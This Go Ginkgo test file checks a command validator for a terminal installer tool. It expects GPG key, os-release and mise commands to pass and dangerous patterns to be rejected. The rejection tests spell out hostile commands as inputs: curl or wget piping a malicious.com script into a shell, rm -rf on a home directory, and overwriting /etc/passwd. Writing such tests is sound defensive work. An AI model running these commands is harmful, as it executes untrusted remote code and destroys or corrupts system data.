package tui

import (
	. "github.com/onsi/ginkgo/v2"
	. "github.com/onsi/gomega"
)

var _ = Describe("GPG Key Command Validation", func() {
	var executor *DefaultCommandExecutor

	BeforeEach(func() {
		executor = NewDefaultCommandExecutor()
	})

	Context("Safe GPG key installation commands", func() {
		It("should allow curl with apt-key add", func() {
			command := "curl -fsSL https://example.com/key.asc | sudo apt-key add -"
			err := executor.ValidateCommand(command)
			Expect(err).ToNot(HaveOccurred())
		})

		It("should allow wget with apt-key add", func() {
			command := "wget -qO- https://example.com/key.asc | sudo apt-key add -"
			err := executor.ValidateCommand(command)
			Expect(err).ToNot(HaveOccurred())
		})

		It("should allow curl with gpg dearmor", func() {
			command := "curl -fsSL https://example.com/key.asc | gpg --dearmor -o /etc/apt/keyrings/key.gpg"
			err := executor.ValidateCommand(command)
			Expect(err).ToNot(HaveOccurred())
		})

		It("should allow wget with gpg dearmor", func() {
			command := "wget -qO- https://example.com/key.asc | gpg --dearmor -o /etc/apt/keyrings/key.gpg"
			err := executor.ValidateCommand(command)
			Expect(err).ToNot(HaveOccurred())
		})
	})

	Context("Safe bash -c system information commands", func() {
		It("should allow bash -c with os-release (single quotes)", func() {
			command := "bash -c '. /etc/os-release && echo $VERSION_CODENAME'"
			err := executor.ValidateCommand(command)
			Expect(err).ToNot(HaveOccurred())
		})

		It("should allow bash -c with os-release (double quotes)", func() {
			command := `bash -c ". /etc/os-release && echo $VERSION_CODENAME"`
			err := executor.ValidateCommand(command)
			Expect(err).ToNot(HaveOccurred())
		})

		It("should allow bash -c with UBUNTU_CODENAME", func() {
			command := "bash -c '. /etc/os-release && echo $UBUNTU_CODENAME'"
			err := executor.ValidateCommand(command)
			Expect(err).ToNot(HaveOccurred())
		})
	})

	Context("Dangerous pipe commands should still be blocked", func() {
		It("should block curl piping to shell", func() {
			command := "curl -fsSL https://malicious.com/script.sh | bash"
			err := executor.ValidateCommand(command)
			Expect(err).To(HaveOccurred())
			Expect(err.Error()).To(ContainSubstring("potentially dangerous pattern"))
		})

		It("should block wget piping to shell", func() {
			command := "wget -qO- https://malicious.com/script.sh | sh"
			err := executor.ValidateCommand(command)
			Expect(err).To(HaveOccurred())
			Expect(err.Error()).To(ContainSubstring("potentially dangerous pattern"))
		})

		It("should block pipes with rm commands", func() {
			command := "echo data | bash -c 'rm -rf /tmp/test'"
			err := executor.ValidateCommand(command)
			Expect(err).To(HaveOccurred())
			Expect(err.Error()).To(ContainSubstring("potentially dangerous pattern"))
		})

		It("should block pipes writing to filesystem", func() {
			command := "echo malicious | bash -c 'cat > /etc/passwd'"
			err := executor.ValidateCommand(command)
			Expect(err).To(HaveOccurred())
			Expect(err.Error()).To(ContainSubstring("potentially dangerous pattern"))
		})

		It("should block malicious bash -c commands without mise patterns", func() {
			command := "bash -c 'curl -fsSL https://malicious.com/script.sh | sh'"
			err := executor.ValidateCommand(command)
			Expect(err).To(HaveOccurred())
			Expect(err.Error()).To(ContainSubstring("potentially dangerous pattern"))
		})

		It("should block bash -c with dangerous shell operations", func() {
			command := "bash -c 'export PATH=$PATH && rm -rf /home/user'"
			err := executor.ValidateCommand(command)
			Expect(err).To(HaveOccurred())
			Expect(err.Error()).To(ContainSubstring("potentially dangerous pattern"))
		})
	})

	Context("Mise language installation commands", func() {
		It("should allow mise PATH setup and use command (single quotes)", func() {
			command := `bash -c 'export PATH="$HOME/.local/bin:$PATH" && if command -v mise >/dev/null 2>&1; then mise use --global go@latest; else echo "mise not found in PATH"; exit 1; fi'`
			err := executor.ValidateCommand(command)
			Expect(err).ToNot(HaveOccurred())
		})

		It("should allow mise PATH setup and install command (single quotes)", func() {
			command := `bash -c 'export PATH="$HOME/.local/bin:$PATH" && mise install python@latest'`
			err := executor.ValidateCommand(command)
			Expect(err).ToNot(HaveOccurred())
		})

		It("should allow mise uninstall command (single quotes)", func() {
			command := `bash -c 'export PATH="$HOME/.local/bin:$PATH" && mise uninstall node@18'`
			err := executor.ValidateCommand(command)
			Expect(err).ToNot(HaveOccurred())
		})

		It("should allow mise conditional installation (double quotes)", func() {
			command := `bash -c "export PATH=\"$HOME/.local/bin:$PATH\" && if command -v mise >/dev/null 2>&1; then mise use --global ruby@latest; fi"`
			err := executor.ValidateCommand(command)
			Expect(err).ToNot(HaveOccurred())
		})

		It("should allow mise PATH with conditional check", func() {
			command := `bash -c 'export PATH="$HOME/.local/bin:$PATH" && if command -v mise >/dev/null 2>&1; then mise install java@latest; else echo "mise not found"; exit 1; fi'`
			err := executor.ValidateCommand(command)
			Expect(err).ToNot(HaveOccurred())
		})
	})

	Context("Specific failing apps from log", func() {
		It("should allow Eza GPG key command", func() {
			// This simulates the command that was failing for Eza
			command := "curl -fsSL https://raw.githubusercontent.com/eza-community/eza/main/deb.asc | sudo apt-key add -"
			err := executor.ValidateCommand(command)
			Expect(err).ToNot(HaveOccurred())
		})

		It("should allow GitHub CLI GPG key command", func() {
			// This simulates the command that was failing for GitHub CLI
			command := "curl -fsSL https://cli.github.com/packages/githubcli-archive-keyring.gpg | sudo apt-key add -"
			err := executor.ValidateCommand(command)
			Expect(err).ToNot(HaveOccurred())
		})

		It("should allow Mise GPG key command", func() {
			// This simulates the command that was failing for Mise
			command := "curl -fsSL https://mise.jdx.dev/gpg-key.pub | sudo apt-key add -"
			err := executor.ValidateCommand(command)
			Expect(err).ToNot(HaveOccurred())
		})

		It("should allow Ulauncher GPG key command", func() {
			// This simulates the command that was failing for Ulauncher
			command := "curl -fsSL http://keyserver.ubuntu.com/pks/lookup?op=get&search=0xfaf1020699503176 | sudo apt-key add -"
			err := executor.ValidateCommand(command)
			Expect(err).ToNot(HaveOccurred())
		})
	})
})
